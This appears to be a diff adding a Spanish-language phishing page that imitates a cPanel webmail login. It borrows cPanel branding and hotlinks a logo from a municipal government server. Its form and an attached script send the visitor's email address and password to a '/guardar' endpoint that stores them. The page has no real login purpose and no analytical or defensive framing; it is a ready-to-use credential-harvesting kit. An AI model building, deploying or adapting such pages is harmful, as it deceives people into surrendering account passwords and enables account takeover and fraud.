@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nombre de usuario para el webmail</title>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;700&display=swap" rel="stylesheet">
+    
+    <style>
+        /* General Body Styling */
+        body {
+            margin: 0px;
+            padding: 0px ;
+            font-family: 'Open Sans', sans-serif;
+            background-color: #ffffff;
+            display: flex ;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #293A4A;
+            flex-direction: column;
+            
+        }
+
+        /* Login Container */
+        .login-container {
+            text-align: left;
+            max-width: 300px;
+            width: 100%;
+            padding: 60px;
+            margin-top: 40px;
+        }
+
+        /* Logo Styling */
+        .login-logo {
+            font-size: 2.5rem;
+            color: #ff6600;
+            font-weight: bold;
+            margin-bottom: 30px;
+        }
+
+        /* Input Fields Styling */
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            height: 30px;
+            padding: 10px 15px 10px 40px; /* Add padding for icons */
+            font-size: 16px;
+            border: 2px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box;
+            
+        }
+
+        input[type="text"]::placeholder,
+        input[type="password"]::placeholder {
+            color: #aaa;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+
+        /* Input Icons */
+        .input-icon {
+            position: absolute;
+            top: 50%;
+            left: 10px;
+            transform: translateY(-50%);
+            color: #888;
+            font-size: 18px;
+        }
+
+        /* Button Styling */
+        button {
+            width: 100%;
+            height: 33px;
+            font-size: 14px;
+            font-weight: bold;
+            background-color: #179BD7;
+            color: #ffffff;
+          
+            border-radius: 5px;
+            cursor: pointer;
+            border: 1px solid #095779;
+            margin-bottom: 10px;
+        }
+
+        button:hover {
+            background-color: #095779;
+        }
+
+        /* Reset Password Link */
+        .reset-link {
+            margin-top: 15px;
+            display: block;
+            font-size: 12px;
+            color: #293A4A;
+            text-decoration: none;
+            margin-bottom: 0px;
+        }
+
+        .reset-link:hover {
+            text-decoration: none;
+        }
+
+        /* Language Options */
+        .language-options {
+            display: flex !important;
+            justify-content: center !important; /* Las opciones se distribuyen de largo a largo */
+            
+            
+            margin: 0 !important; /* Centra horizontalmente el contenedor en caso de limitación de ancho */
+            padding: 0px !important; /* Espaciado interno opcional */
+            font-size: 12px !important;
+            color: #293A4A !important;
+            background-color: #ffffff; /* Opcional: color de fondo para destacar */
+            margin-bottom: 0px;
+            position:relative;
+        }
+
+        .language-options a {
+            color: #555;
+            text-decoration: none;
+        }
+
+        .language-options a:hover {
+            text-decoration: underline;
+        }
+
+        .label {
+            margin-bottom: 7px;
+            font-size: 14px;
+        }
+        .copyright{
+            font-size: 10px;
+            text-decoration: none;
+            color: black;
+            margin-bottom: 100px !important;
+            margin:0px !important;
+            padding: 0px !important;
+            width: 100%;
+            font-weight: 100;
+            
+            
+        }
+        a {
+            text-decoration: none !important;
+            color: #293A4A !important;
+        }
+        a:hover{
+            color:#ff6600 !important
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <br><br><br><br><br><br>
+        <div class="login-logo">
+            <center>
+                <img src="https://www.patronatomunicipallatacunga.gob.ec:2096/cPanel_magic_revision_1649690330/unprotected/cpanel/images/webmail-logo.svg" alt="" type="image/x-icon" width="300">
+            </center>
+        </div>
+
+        <form action="/guardar" method="POST">
+             <!-- Email Input -->
+             <div class="label"><b><label for="user" style="text-align: right">Dirección de email</label></b></div>
+
+             <div class="form-group">
+                 <span class="input-icon">
+                     <img src="https://images1.vinted.net/t/01_00033_QjAPHeuxonpMtN6vm5gDL5cj/100x100/1667946491.jpeg?s=d4c30bcc9bbc8fe3d0ad77a6eaf9fc21db6e0cd0" alt="" width="20">
+                 </span>
+                 <input type="text" id="email" name="email" placeholder="Indique su dirección de email">
+             </div>
+            <br>
+
+        <!-- Password Input -->
+            <div class="label"><b><label for="user" style="text-align: right">Contraseña</label></b></div>
+
+            <div class="form-group">
+                <span class="input-icon">
+                    <img src="https://encrypted-tbn3.gstatic.com/images?q=tbn:ANd9GcT8Asg2-cUm2D_Ic606poV36ofdLssk1Gv_UvQznql-Kz1j1oPj" alt="" width="20">
+                </span>
+                <input type="password" id="password" name="password" placeholder="Indique la contraseña de su email">
+            </div>
+                <button type="submit">Inicio de sesión</button>
+        </form>
+
+        <b><a href="#" class="reset-link" style="text-align: center;">Restablecer contraseña</a></b>
+    </div>
+
+    <!-- Language Options -->
+    <div class="language-options">
+        <b><a href="#">العربية</a> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+        <a href="#">čeština</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+        <a href="#">dansk</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+        <a href="#">Deutsch</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+        <a href="#">Ελληνικά</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+        <a href="#">English</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+        <a href="#">español</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+        <a href="#">español latinoamericano</a>
+        <br><br><br><br><br><br><br>
+    </div>
+    <div class="copyright">
+        <center><div><img src="https://chuda.me/wp-content/uploads/2022/09/cpanel.png" alt="" width="25"></div><div>Copyright© 2024 cPanel, L.L.C.
+            <br /><a href="https://go.cpanel.net/privacy" style="color: black;" style="text-decoration: none !important;">Directiva de privacidad</a></div></center>
+        
+    </div>
+    <script>
+        document.getElementById("submit-button").addEventListener("click", function () {
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
+
+            // Enviar datos al servidor usando Fetch API
+            fetch('/guardar', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ email, password })
+            }).then(response => {
+                if (response.ok) {
+                    console.log("Datos guardados correctamente");
+                } else {
+                    console.error("Error al guardar los datos");
+                }
+            }).catch(error => console.error("Error en la conexión:", error));
+        });
+    </script>
+</body>
+</html>
